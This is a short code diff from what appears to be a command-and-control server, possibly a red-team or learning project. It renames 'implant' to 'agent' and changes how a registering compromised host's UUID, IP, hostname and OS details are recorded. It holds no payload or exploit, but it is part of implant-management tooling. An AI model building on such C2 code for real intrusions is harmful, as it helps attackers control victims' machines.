@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 
-from .implant import Implant
+from .agent import Agent
 import cgi
 from uuid import uuid4
 
 
-def register_implant(listener):
+def register_agent(listener):
     listener.send_response(200)
     listener.send_header('content-type', 'text/html')
     # Always have to close the header.
@@ -41,17 +41,18 @@ def register_implant(listener):
         # This reads each part of the form
         fields = cgi.parse_multipart(listener.rfile, pdict)
         # Grab the "task" field that was input by the post request.
-        uuid = "garfield"
+        # uuid = uuid4()
+        uuid = "uuid"
         tgt_ip = listener.client_address
         tgt_hostname = fields.get('hostname')
         tgt_os = fields.get('os type')
         tgt_os_version = fields.get('os version')
-        print(f"Implant UUID:        {uuid}")
+        print(f"Agent UUID:        {uuid}")
         print(f"Target IP Address:   {tgt_ip}")
         print(f"Target Hostname:     {tgt_hostname}")
         print(f"Target OS:           {tgt_os}")
         print(f"Target OS Version:   {tgt_os_version}\n")
-        Implant(uuid, tgt_ip, tgt_hostname, tgt_os, tgt_os_version)
+        Agent(uuid, tgt_ip, tgt_hostname, tgt_os, tgt_os_version)
         # Come back to this later to add to dict ******************************************
         # tasklist.append(new_task[0])
 
